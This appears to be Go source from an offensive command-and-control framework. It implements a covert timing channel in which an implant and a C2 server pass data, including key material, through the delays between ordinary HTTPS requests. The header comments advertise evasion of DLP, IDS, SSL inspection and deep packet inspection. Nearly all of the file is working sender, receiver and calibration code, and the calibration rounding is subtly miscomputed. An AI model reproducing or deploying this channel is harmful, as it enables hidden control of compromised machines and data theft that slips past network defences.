package timing

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Covert Timing Channel — data transmission via inter-packet timing gaps.

	Concept:
	  Instead of hiding data in packet *contents*, we hide it in the
	  *time gaps between packets*. The content of every packet is
	  completely innocent (HTTPS requests to any legitimate server).
	  The only carrier of information is the delay between requests.

	Encoding (Line encoding):
	  We use Manchester-like encoding with 3 symbols:
	    SHORT gap (BIT_0_GAP)  → binary 0
	    LONG  gap (BIT_1_GAP)  → binary 1
	    SYNC  gap (SYNC_GAP)   → frame boundary (8 bits = 1 byte)

	  Default timings (adjustable per engagement):
	    BIT_0_GAP = 100 ms
	    BIT_1_GAP = 300 ms
	    SYNC_GAP  = 600 ms
	    TOLERANCE = ±40 ms  (jitter tolerance for measurement)

	Capacity:
	  At these timings, one byte takes:
	    8 bits * avg(100ms+300ms)/2 = 1600 ms + 600ms SYNC = 2200 ms/byte
	    ≈ 0.45 bytes/sec = 3.6 bits/sec
	  Suitable for: command ACK, small config updates, key material
	  NOT suitable for: large file exfiltration

	Roles:
	  Sender: controls the timing gaps between its own HTTPS requests.
	  Receiver: timestamps the arrival of those HTTPS requests and
	            measures the gaps to decode the data stream.

	In the C2 context:
	  Sender   = implant (data → C2)
	  Receiver = C2 server (measures timestamps of inbound HTTP requests)
	  OR
	  Sender   = C2 server (controls timing of HTTP responses)
	  Receiver = implant (measures gaps between response arrivals)

	Covertness:
	  - No anomalous destination IPs (all packets go to normal HTTPS servers)
	  - No anomalous packet sizes or content
	  - Timing-based detection requires full packet capture + statistical analysis
	  - Most DLP/IDS solutions do NOT perform timing correlation
	  - The channel survives content inspection, SSL inspection, and DPI

	Limitations:
	  - Very low bandwidth (~3 bits/sec)
	  - Susceptible to network jitter (use larger tolerance on high-jitter links)
	  - Both sides must have synchronized reference timing (NTP)
	  - The receiving server must capture the exact arrival timestamps
*/

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"time"
)

// TimingConfig holds timing channel parameters.
type TimingConfig struct {
	// Bit timing values.
	Bit0Gap   time.Duration // gap for binary 0
	Bit1Gap   time.Duration // gap for binary 1
	SyncGap   time.Duration // gap for byte frame boundary
	Tolerance time.Duration // acceptable measurement error

	// CoverURL is the HTTPS URL to "ping" for each timing slot.
	// Should be a legitimate URL (analytics, CDN, etc.).
	CoverURL string

	// Receiver-side: CaptureFunc is called with the measured gap after each
	// HTTP request arrives. If nil, the default HTTP server mode is used.
	CaptureFunc func(gap time.Duration)
}

// DefaultConfig returns timing parameters tuned for low-jitter corporate networks.
func DefaultConfig(coverURL string) *TimingConfig {
	return &TimingConfig{
		Bit0Gap:   100 * time.Millisecond,
		Bit1Gap:   300 * time.Millisecond,
		SyncGap:   600 * time.Millisecond,
		Tolerance:  40 * time.Millisecond,
		CoverURL:  coverURL,
	}
}

// TimingSender sends data via inter-request timing gaps.
type TimingSender struct {
	cfg    *TimingConfig
	client *http.Client
}

// NewSender creates a new timing channel sender.
func NewSender(cfg *TimingConfig) *TimingSender {
	return &TimingSender{
		cfg:    cfg,
		client: &http.Client{Timeout: 5 * time.Second},
	}
}

// Send transmits data bytes over the timing channel.
// Each byte is sent as 8 timing gaps followed by a SYNC gap.
func (s *TimingSender) Send(ctx context.Context, data []byte) error {
	for _, b := range data {
		// Send 8 bits MSB first.
		for bit := 7; bit >= 0; bit-- {
			select {
			case <-ctx.Done():
				return ctx.Err()
			default:
			}
			if (b>>uint(bit))&1 == 1 {
				if err := s.sendSlot(ctx, s.cfg.Bit1Gap); err != nil {
					return err
				}
			} else {
				if err := s.sendSlot(ctx, s.cfg.Bit0Gap); err != nil {
					return err
				}
			}
		}
		// SYNC gap after each byte.
		if err := s.sendSlot(ctx, s.cfg.SyncGap); err != nil {
			return err
		}
	}
	return nil
}

// sendSlot waits `gap` then sends a cover HTTP request.
func (s *TimingSender) sendSlot(ctx context.Context, gap time.Duration) error {
	timer := time.NewTimer(gap)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
	}
	// Fire cover request (content doesn't matter).
	req, err := http.NewRequestWithContext(ctx, "GET", s.cfg.CoverURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("Cache-Control", "no-cache")
	resp, err := s.client.Do(req)
	if err != nil {
		// Network errors are non-fatal — the timing signal was already sent.
		return nil
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
	return nil
}

// ─── Receiver ─────────────────────────────────────────────────────────────

// TimingReceiver decodes data from measured inter-request gaps.
type TimingReceiver struct {
	cfg      *TimingConfig
	gapCh    chan time.Duration
	lastTime time.Time
}

// NewReceiver creates a new timing channel receiver.
func NewReceiver(cfg *TimingConfig) *TimingReceiver {
	return &TimingReceiver{
		cfg:   cfg,
		gapCh: make(chan time.Duration, 256),
	}
}

// RecordArrival records the arrival of one cover HTTP request.
// Call this from the HTTP handler on the receiving side.
func (r *TimingReceiver) RecordArrival() {
	now := time.Now()
	if !r.lastTime.IsZero() {
		gap := now.Sub(r.lastTime)
		select {
		case r.gapCh <- gap:
		default:
		}
	}
	r.lastTime = now
}

// Receive reads decoded bytes from the timing channel.
// Blocks until at least one byte is decoded or ctx is cancelled.
func (r *TimingReceiver) Receive(ctx context.Context, buf []byte) (int, error) {
	n := 0
	for n < len(buf) {
		b, err := r.receiveByte(ctx)
		if err != nil {
			return n, err
		}
		buf[n] = b
		n++
	}
	return n, nil
}

// receiveByte decodes one byte from the gap stream.
func (r *TimingReceiver) receiveByte(ctx context.Context) (byte, error) {
	var b byte
	for bit := 7; bit >= 0; bit-- {
		gap, err := r.readGap(ctx)
		if err != nil {
			return 0, err
		}
		v, err := r.decodeGap(gap)
		if err != nil {
			// Out-of-tolerance: might be a SYNC — reset and retry.
			return 0, fmt.Errorf("gap decode error at bit %d: %w", bit, err)
		}
		if v == 1 {
			b |= 1 << uint(bit)
		}
	}
	// Consume SYNC gap.
	syncGap, _ := r.readGap(ctx)
	_ = syncGap // SYNC gap validation: could check it matches cfg.SyncGap
	return b, nil
}

func (r *TimingReceiver) readGap(ctx context.Context) (time.Duration, error) {
	select {
	case <-ctx.Done():
		return 0, ctx.Err()
	case gap := <-r.gapCh:
		return gap, nil
	}
}

func (r *TimingReceiver) decodeGap(gap time.Duration) (int, error) {
	tol := r.cfg.Tolerance
	if absDur(gap-r.cfg.Bit0Gap) <= tol {
		return 0, nil
	}
	if absDur(gap-r.cfg.Bit1Gap) <= tol {
		return 1, nil
	}
	if absDur(gap-r.cfg.SyncGap) <= tol {
		return -1, nil // SYNC symbol
	}
	return 0, fmt.Errorf("gap %v not near any symbol (0=%v 1=%v sync=%v tol=%v)",
		gap, r.cfg.Bit0Gap, r.cfg.Bit1Gap, r.cfg.SyncGap, tol)
}

func absDur(d time.Duration) time.Duration {
	if d < 0 {
		return -d
	}
	return d
}

// ─── Adaptive calibration ─────────────────────────────────────────────────

// Calibrate measures the network round-trip jitter by sending
// a probe sequence and returns the measured jitter (95th percentile).
// Use this to set an appropriate Tolerance before starting the channel.
func Calibrate(ctx context.Context, probeURL string, samples int) (time.Duration, error) {
	client := &http.Client{Timeout: 5 * time.Second}
	if samples <= 0 {
		samples = 20
	}
	rtts := make([]time.Duration, 0, samples)

	for i := 0; i < samples; i++ {
		req, _ := http.NewRequestWithContext(ctx, "GET", probeURL, nil)
		start := time.Now()
		resp, err := client.Do(req)
		rtt := time.Since(start)
		if err == nil {
			resp.Body.Close()
			rtts = append(rtts, rtt)
		}
		time.Sleep(50 * time.Millisecond)
	}

	if len(rtts) == 0 {
		return 0, fmt.Errorf("all probe requests failed")
	}

	// Sort and take 95th percentile.
	sortDurations(rtts)
	p95 := rtts[int(float64(len(rtts))*0.95)]

	// Round up to nearest 10ms.
	return (p95/10*time.Millisecond + 10*time.Millisecond), nil
}

func sortDurations(d []time.Duration) {
	for i := range d {
		for j := i + 1; j < len(d); j++ {
			if d[j] < d[i] {
				d[i], d[j] = d[j], d[i]
			}
		}
	}
}

// EstimatedThroughput returns the expected channel throughput in bytes/second.
func EstimatedThroughput(cfg *TimingConfig) float64 {
	avgBitGap := float64(cfg.Bit0Gap+cfg.Bit1Gap) / 2.0
	timePerByte := 8.0*avgBitGap + float64(cfg.SyncGap)
	return 1.0 / (timePerByte / float64(time.Second))
}
